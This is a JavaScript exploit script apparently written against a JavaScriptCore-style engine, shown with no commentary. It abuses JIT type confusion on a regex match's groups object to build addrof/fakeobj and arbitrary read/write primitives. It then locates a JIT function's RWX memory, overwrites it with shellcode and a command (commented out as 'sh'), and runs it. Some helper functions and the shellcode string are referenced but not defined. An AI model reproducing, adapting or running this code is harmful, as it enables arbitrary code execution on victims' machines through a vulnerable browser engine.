function createArrayWithSlowPutArrayStorage() {
    let protoWithIndexedAccessors = {};
    Object.defineProperty(protoWithIndexedAccessors, 100, { value : 0xdeadbeef });

    function helper(i) {
        let a = [];
        if (i > 0) Object.setPrototypeOf(a, protoWithIndexedAccessors);
        return a;
    }

	for(let i = 0; i < 10000; i++)
        helper(i);
    return helper(0);
}

function initialize(){
	print('start initialize');

	let arr1 = new Uint32Array(4);
	let arr2 = new Uint32Array(4);
	let objX = {objProperty: {target: 0xdeadbeef}};
	let objY = {arrProperty: 0};

	let group = {};
	for(let i = 0; i < 2; i++)
		group[`inlineProperty${i}`] = i;
	group.oolProperty0 = objX;

	let fake_match = createArrayWithSlowPutArrayStorage();
	fake_match.index = 0;
	fake_match.input = "";
	fake_match.groups = group;

	let confuse = fake_match;
	confuse = fake_match;

	Object.defineProperty(Array.prototype, 1337, { value : 0xcafebabe });

	let load = () => confuse.groups.oolProperty0.objProperty.target;

	for(let i = 0; i < 10000; i++)
		load();

	let match = "hoge".match(/(?<ool>)/);
	match.groups.ool= objY;
	confuse = match;

	objY.arrProperty = arr1;
	arr1[0] = 10000;
	arr1[1] = 0x01082407;

	let victim = load();
	victim.target = 0xdeadbeef;
	victim[2] = 0xdeadbeef
	let struct_id = arr1[0];

	addrof = function(obj){
		arr1[1] = 0x0108240d;	// m_indexingTypeAndMisc == 0xd
		victim[0] = obj;
		arr1[1] = 0x01082407;	// m_indexingTypeAndMisc == 0x7
		let addr = f2u(victim[2]);
		return addr;
	}

	fakeobj = function(addr){
		arr1[1] = 0x01082407;
		victim[2] = u2f(addr);
		arr1[1] = 0x0108240d;
		return victim[0];
	}

	objY.arrProperty = arr2;
	arr2[0] = struct_id;
	arr2[1] = 0x01082407;

	let aarw = load();

	read64f = function(addr){
		arr2[2] = addr % 0x100000000 + 0x10;
		arr2[3] = Math.floor(addr / 0x100000000);
		return addrof(aarw.target);
	}

	write64f = function(addr, value){
		arr2[2] = addr % 0x100000000 + 0x10;
		arr2[3] = Math.floor(addr / 0x100000000);
		aarw.target = u2jsv(value);
	}

	write16u = function(addr, value){
		arr2[2] = addr % 0x100000000 + 0x10;
		arr2[3] = Math.floor(addr / 0x100000000);
		aarw.target = value;
	}

	write32u = function(addr, value){
		write16u(addr, value % 0x10000)
		write16u(addr+2, Math.floor(value / 0x10000))
	}

	dump = function(addr, size){
		addr -= 4
		let d = ""
		for(let i = 0; i < size/4; i++){
			if(i%4 == 0)
				d += `${hex(addr + 4*(i+1))}: `
			v = Math.floor(read64f(addr + 4*i) / 0x100000000)
			for(let j = 0; j < 4; j++){
				d += `0${(v&0xff).toString(16)} `.substr(-3)
				v = Math.floor(v/0x100)
			}
			d += '  '
			if((i+1)%4 == 0)
				d += '\n'
		}
		print(d)
	}

	print('initialized');
}

function exploit(cmd_str){
	function jit(){
		return [];
	}

	for(let i = 0; i < 10000; i++)
		jit();

	let addr_function = addrof(jit);
	print(`[+] addr jit function : ${hex(addr_function)}`)
	let addr_executable = read64f(addr_function + 0x18);
	print(`[+] addr executable   : ${hex(addr_executable)}`)
	let addr_JITCode = read64f(addr_executable + 0x18);
	print(`[+] addr JITCode      : ${hex(addr_JITCode)}`)
	let addr_rwx = read64f(addr_JITCode + 0x10);
	print(`[+] addr rwx area     : ${hex(addr_rwx)}`)

	dump(addr_rwx, 0x20)

	let shellcode = unhexlify(shellcode_str);
	let cmd = string_to_buffer(cmd_str);

	let payload = concat_buffer([shellcode, cmd])
	payload = new Uint32Array(payload);
	for(let i = 0; i < payload.length; i++)
		write32u(addr_rwx + 4*i, payload[i])

	dump(addr_rwx, 0x20)

	print('[+] Go!')
	jit();
}

//initialize();
//exploit("sh\x00");
